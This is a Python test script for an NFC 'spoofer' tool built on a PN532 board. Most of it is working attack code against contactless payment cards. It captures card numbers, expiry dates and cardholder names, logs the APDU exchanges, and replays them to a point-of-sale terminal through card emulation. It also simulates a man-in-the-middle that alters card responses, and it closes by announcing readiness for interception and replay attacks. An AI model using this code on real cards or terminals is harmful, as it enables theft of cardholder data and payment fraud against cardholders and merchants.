#!/usr/bin/env python3
"""
🔧 PN532 NFC Interception & Replay Test  
NFCSpoofer V4.05 - Development board NFC attack capabilities

This test demonstrates PN532-based attacks:
- NFC card interception and data capture
- APDU logging and analysis
- Card emulation for replay attacks
- Man-in-the-middle NFC attacks

⚠️ RESEARCH & EDUCATIONAL USE ONLY
"""

import sys
import os
import time
import json
from datetime import datetime
import threading

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cardreader_pn532 import PN532Reader
from emvcard import EMVCard
import logger


class PN532SniffReplayTest:
    """PN532 NFC sniffing and replay testing."""
    
    def __init__(self):
        self.logger = logger.Logger()
        self.pn532 = None
        self.captured_cards = []
        self.intercepted_data = []
        
        try:
            self.pn532 = PN532Reader(logger=self.logger)
            self.logger.log("✅ PN532 initialized for NFC operations")
        except Exception as e:
            self.logger.log(f"❌ PN532 initialization failed: {e}")
    
    def test_nfc_interface_detection(self):
        """Test PN532 interface detection and connectivity."""
        
        print("\n🔍 STEP 1: NFC INTERFACE DETECTION")
        print("-" * 50)
        
        if not self.pn532:
            print("❌ PN532 not available")
            return False
        
        try:
            # Enumerate interfaces
            self.pn532.enumerate_interfaces()
            interfaces = self.pn532.list_interfaces()
            
            print("✅ Available NFC interfaces:")
            for i, interface in enumerate(interfaces):
                print(f"   [{i}] {interface}")
            
            # Test default interface
            default_interface = self.pn532.get_interface(0)
            print(f"✅ Default interface: {default_interface}")
            
            return len(interfaces) > 0
            
        except Exception as e:
            print(f"❌ Interface detection failed: {e}")
            return False
    
    def test_card_interception(self, duration: int = 30):
        """Test intercepting NFC card data."""
        
        print(f"\n📡 STEP 2: CARD INTERCEPTION TEST ({duration}s)")
        print("-" * 50)
        
        if not self.pn532:
            print("❌ PN532 not available")
            return False
        
        try:
            print("🔧 Starting NFC card interception...")
            print("   Present cards to PN532 antenna...")
            
            intercepted_cards = []
            
            def card_callback(card_data):
                """Callback for intercepted card data."""
                if card_data:
                    card_info = {
                        "timestamp": datetime.now().isoformat(),
                        "card_type": type(card_data).__name__,
                        "card_data": self._extract_card_info(card_data),
                        "apdu_log": getattr(card_data, 'apdu_log', [])
                    }
                    
                    intercepted_cards.append(card_info)
                    
                    # Display intercepted card info
                    print(f"📱 Card intercepted:")
                    card_data_info = card_info["card_data"]
                    for key, value in card_data_info.items():
                        if value:
                            print(f"   {key}: {value}")
                    
                    print(f"   APDUs captured: {len(card_info['apdu_log'])}")
            
            # Start polling for cards
            self.pn532.start_polling(card_callback, debounce=2.0, interval=0.5)
            
            # Wait for specified duration
            time.sleep(duration)
            
            # Stop polling
            self.pn532.stop_polling()
            
            print(f"\n✅ Interception complete:")
            print(f"   Cards intercepted: {len(intercepted_cards)}")
            
            # Store captured data
            self.captured_cards.extend(intercepted_cards)
            
            # Show summary of captured data
            if intercepted_cards:
                print("\n📊 Captured card summary:")
                for i, card in enumerate(intercepted_cards):
                    card_data = card["card_data"]
                    print(f"   Card {i+1}: PAN={card_data.get('pan', 'Unknown')} APDUs={len(card['apdu_log'])}")
            
            return len(intercepted_cards) > 0
            
        except Exception as e:
            print(f"❌ Card interception failed: {e}")
            return False
    
    def test_apdu_analysis(self):
        """Analyze captured APDU data."""
        
        print("\n🔍 STEP 3: APDU ANALYSIS")
        print("-" * 50)
        
        if not self.captured_cards:
            print("⚠️ No captured cards available for analysis")
            return False
        
        total_apdus = 0
        emv_commands = set()
        
        print("📋 APDU Analysis Results:")
        
        for i, card in enumerate(self.captured_cards):
            apdu_log = card.get("apdu_log", [])
            card_data = card.get("card_data", {})
            
            print(f"\n   Card {i+1} - PAN: {card_data.get('pan', 'Unknown')}")
            print(f"     Total APDUs: {len(apdu_log)}")
            
            # Analyze APDU commands
            command_counts = {}
            
            for apdu in apdu_log:
                cmd = apdu.get("cmd", "")
                resp = apdu.get("resp", "")
                
                total_apdus += 1
                
                # Parse command
                if len(cmd) >= 8:  # Minimum APDU length
                    cmd_bytes = cmd.split()[:4]  # CLA INS P1 P2
                    cmd_key = " ".join(cmd_bytes)
                    
                    command_counts[cmd_key] = command_counts.get(cmd_key, 0) + 1
                    
                    # Identify EMV commands
                    emv_cmd = self._identify_emv_command(cmd_bytes)
                    if emv_cmd:
                        emv_commands.add(emv_cmd)
            
            # Display command analysis
            print("     Command breakdown:")
            for cmd, count in sorted(command_counts.items()):
                emv_name = self._identify_emv_command(cmd.split())
                display_name = emv_name if emv_name else cmd
                print(f"       {display_name}: {count}")
        
        print(f"\n🏆 Analysis Summary:")
        print(f"   Total APDUs analyzed: {total_apdus}")
        print(f"   Unique EMV commands: {len(emv_commands)}")
        print(f"   EMV commands found: {', '.join(sorted(emv_commands))}")
        
        return total_apdus > 0
    
    def test_card_emulation(self):
        """Test emulating captured cards using PN532."""
        
        print("\n🎯 STEP 4: CARD EMULATION TEST")
        print("-" * 50)
        
        if not self.captured_cards:
            print("⚠️ No captured cards available for emulation")
            return False
        
        # Select best card for emulation
        emulation_candidate = None
        
        for card in self.captured_cards:
            apdu_log = card.get("apdu_log", [])
            
            # Need sufficient APDU data for good emulation
            if len(apdu_log) >= 3:
                emulation_candidate = card
                break
        
        if not emulation_candidate:
            print("⚠️ No suitable card found for emulation")
            return False
        
        print("🔧 Starting card emulation...")
        print("   Position PN532 near POS terminal or card reader...")
        
        try:
            # Prepare APDU response map
            apdu_responses = {}
            apdu_log = emulation_candidate.get("apdu_log", [])
            
            for apdu in apdu_log:
                cmd = apdu.get("cmd", "")
                resp = apdu.get("resp", "")
                
                if cmd and resp:
                    # Convert to bytes for emulation
                    cmd_bytes = self._hex_string_to_bytes(cmd)
                    resp_bytes = self._hex_string_to_bytes(resp)
                    
                    if cmd_bytes and resp_bytes:
                        # Use first 4 bytes (CLA INS P1 P2) as key
                        key = tuple(cmd_bytes[:4]) if len(cmd_bytes) >= 4 else tuple(cmd_bytes)
                        apdu_responses[key] = resp_bytes
            
            print(f"   Loaded {len(apdu_responses)} APDU responses")
            
            # Start emulation using nfcpy
            import nfc
            
            emulation_success = False
            emulated_commands = []
            
            def emulation_handler(apdu_cmd):
                """Handle APDU commands during emulation."""
                
                nonlocal emulation_success, emulated_commands
                
                # Log the command
                emulated_commands.append({
                    "timestamp": datetime.now().isoformat(),
                    "command": apdu_cmd.hex(),
                    "command_analysis": self._analyze_apdu_command(apdu_cmd)
                })
                
                print(f"📡 POS Command: {apdu_cmd.hex()}")
                
                # Find matching response
                key = tuple(apdu_cmd[:4]) if len(apdu_cmd) >= 4 else tuple(apdu_cmd)
                response = apdu_responses.get(key, bytes([0x6F, 0x00]))  # Default error
                
                print(f"   Our Response: {response.hex()}")
                
                emulation_success = True
                return response
            
            # Run emulation with timeout
            with nfc.ContactlessFrontend('usb') as clf:
                clf.connect(
                    emulation={'on-command': emulation_handler},
                    timeout=30.0  # 30 second timeout
                )
            
            print(f"\n✅ Emulation test complete:")
            print(f"   Commands handled: {len(emulated_commands)}")
            print(f"   Emulation success: {'YES' if emulation_success else 'NO'}")
            
            # Display emulated commands
            if emulated_commands:
                print("\n📋 Commands handled during emulation:")
                for i, cmd in enumerate(emulated_commands[:5]):  # Show first 5
                    analysis = cmd.get("command_analysis", {})
                    print(f"   {i+1}. {analysis.get('name', 'Unknown')} ({cmd['command'][:16]}...)")
            
            return emulation_success
            
        except Exception as e:
            print(f"❌ Card emulation failed: {e}")
            return False
    
    def test_mitm_attack(self, duration: int = 30):
        """Test man-in-the-middle NFC attack."""
        
        print(f"\n🔄 STEP 5: MAN-IN-THE-MIDDLE ATTACK ({duration}s)")
        print("-" * 50)
        
        if not self.pn532:
            print("❌ PN532 not available")
            return False
        
        print("🔧 Starting MITM attack simulation...")
        print("   This simulates intercepting and modifying NFC communications")
        
        try:
            mitm_data = {
                "start_time": datetime.now().isoformat(),
                "intercepted_exchanges": [],
                "modified_responses": []
            }
            
            # Simulate MITM by capturing and potentially modifying data
            def mitm_callback(card_data):
                """MITM callback - intercept and potentially modify."""
                
                if card_data:
                    apdu_log = getattr(card_data, 'apdu_log', [])
                    
                    for apdu in apdu_log:
                        exchange = {
                            "timestamp": datetime.now().isoformat(),
                            "original_command": apdu.get("cmd", ""),
                            "original_response": apdu.get("resp", ""),
                            "modified": False
                        }
                        
                        # Simulate response modification for specific commands
                        if self._should_modify_response(apdu):
                            modified_resp = self._modify_apdu_response(apdu.get("resp", ""))
                            exchange["modified_response"] = modified_resp
                            exchange["modified"] = True
                            
                            print(f"🔄 Modified APDU response:")
                            print(f"   Original:  {apdu.get('resp', '')[:20]}...")
                            print(f"   Modified:  {modified_resp[:20]}...")
                        
                        mitm_data["intercepted_exchanges"].append(exchange)
            
            # Run MITM interception
            self.pn532.start_polling(mitm_callback, interval=0.5)
            time.sleep(duration)
            self.pn532.stop_polling()
            
            mitm_data["end_time"] = datetime.now().isoformat()
            
            total_exchanges = len(mitm_data["intercepted_exchanges"])
            modified_exchanges = len([e for e in mitm_data["intercepted_exchanges"] if e.get("modified")])
            
            print(f"\n✅ MITM attack simulation complete:")
            print(f"   Total exchanges: {total_exchanges}")
            print(f"   Modified exchanges: {modified_exchanges}")
            
            # Store MITM data
            self.intercepted_data.append(mitm_data)
            
            return total_exchanges > 0
            
        except Exception as e:
            print(f"❌ MITM attack failed: {e}")
            return False
    
    def _extract_card_info(self, card_data) -> dict:
        """Extract relevant information from card data."""
        
        info = {}
        
        # Try to get basic card attributes
        for attr in ['pan', 'expiry_date', 'cardholder_name', 'service_code']:
            value = getattr(card_data, attr, None)
            if value:
                info[attr] = value
        
        return info
    
    def _identify_emv_command(self, cmd_bytes: list) -> str:
        """Identify EMV command from bytes."""
        
        if len(cmd_bytes) < 2:
            return None
        
        cla = cmd_bytes[0]
        ins = cmd_bytes[1]
        
        commands = {
            ("00", "A4"): "SELECT",
            ("80", "A8"): "GET_PROCESSING_OPTIONS",
            ("00", "B2"): "READ_RECORD", 
            ("80", "AE"): "GENERATE_AC",
            ("00", "84"): "GET_CHALLENGE",
            ("80", "CA"): "GET_DATA"
        }
        
        return commands.get((cla, ins), None)
    
    def _hex_string_to_bytes(self, hex_str: str) -> bytes:
        """Convert hex string to bytes."""
        
        try:
            # Remove spaces and convert
            hex_clean = hex_str.replace(" ", "")
            return bytes.fromhex(hex_clean)
        except:
            return b""
    
    def _analyze_apdu_command(self, apdu_bytes: bytes) -> dict:
        """Analyze APDU command bytes."""
        
        if len(apdu_bytes) < 4:
            return {"name": "Invalid APDU", "length": len(apdu_bytes)}
        
        cla = f"{apdu_bytes[0]:02X}"
        ins = f"{apdu_bytes[1]:02X}"
        p1 = f"{apdu_bytes[2]:02X}"
        p2 = f"{apdu_bytes[3]:02X}"
        
        # Identify command
        cmd_name = self._identify_emv_command([cla, ins])
        
        return {
            "name": cmd_name or f"Unknown ({cla} {ins})",
            "cla": cla,
            "ins": ins,
            "p1": p1,
            "p2": p2,
            "length": len(apdu_bytes)
        }
    
    def _should_modify_response(self, apdu: dict) -> bool:
        """Determine if APDU response should be modified for MITM."""
        
        cmd = apdu.get("cmd", "")
        
        # Modify responses to specific commands for demonstration
        if "00 A4" in cmd:  # SELECT command
            return True
        
        if "80 A8" in cmd:  # GET PROCESSING OPTIONS
            return True
        
        return False
    
    def _modify_apdu_response(self, original_resp: str) -> str:
        """Modify APDU response for MITM attack."""
        
        # Simple modification - change last byte before status word
        resp_parts = original_resp.split()
        
        if len(resp_parts) >= 3:
            # Change second-to-last byte
            resp_parts[-2] = "FF"
            return " ".join(resp_parts)
        
        return original_resp


def run_pn532_comprehensive_test():
    """Run comprehensive PN532 test suite."""
    
    print("🔧 PN532 NFC INTERCEPTION & REPLAY TEST")
    print("=" * 70)
    
    # Initialize test system
    test_system = PN532SniffReplayTest()
    
    # Run test sequence
    test_results = {}
    
    # Test 1: Interface Detection
    test_results["interface_detection"] = test_system.test_nfc_interface_detection()
    
    # Test 2: Card Interception
    test_results["card_interception"] = test_system.test_card_interception(duration=20)
    
    # Test 3: APDU Analysis
    test_results["apdu_analysis"] = test_system.test_apdu_analysis()
    
    # Test 4: Card Emulation
    test_results["card_emulation"] = test_system.test_card_emulation()
    
    # Test 5: MITM Attack
    test_results["mitm_attack"] = test_system.test_mitm_attack(duration=15)
    
    # Summary
    print("\n🏆 PN532 TEST RESULTS")
    print("-" * 50)
    
    passed_tests = 0
    total_tests = len(test_results)
    
    for test_name, result in test_results.items():
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{status} {test_name.replace('_', ' ').title()}")
        
        if result:
            passed_tests += 1
    
    print(f"\nOverall: {passed_tests}/{total_tests} tests passed")
    
    if passed_tests >= 3:
        print("🟢 PN532 SYSTEM: OPERATIONAL")
        print("   Ready for NFC interception and replay attacks!")
    elif passed_tests >= 1:
        print("🟡 PN532 SYSTEM: PARTIAL")
        print("   Basic functionality available, some features need setup.")
    else:
        print("🔴 PN532 SYSTEM: NOT OPERATIONAL")
        print("   Hardware not available or needs configuration.")
    
    return passed_tests >= 3


if __name__ == "__main__":
    print("Running PN532 comprehensive test...")
    success = run_pn532_comprehensive_test()
    print(f"\n🎯 PN532 test completed. System: {'OPERATIONAL' if success else 'NEEDS WORK'}!")
